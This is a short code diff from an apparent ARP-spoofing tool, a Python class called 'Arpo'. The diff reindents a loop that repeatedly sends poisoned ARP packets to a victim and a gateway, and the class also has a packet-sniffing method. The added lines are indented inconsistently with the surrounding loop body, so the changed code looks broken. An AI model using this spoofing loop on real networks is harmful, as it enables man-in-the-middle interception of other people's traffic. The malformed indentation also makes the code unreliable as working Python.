@@ -62,14 +62,14 @@ class Arpo:
         while True:
             sys.stdout.write('.')
             sys.stdout.flush()
-        try:
-            send(poison_victim)
-            send(poison_gateway)
-        except KeyboardInterrupt:
-            self.restore()
-            sys.exit()
-        else:
-            time.sleep(2)
+          try:
+              send(poison_victim)
+              send(poison_gateway)
+          except KeyboardInterrupt:
+              self.restore()
+              sys.exit()
+          else:
+              time.sleep(2)
 
 
     def sniff(self, count=100):
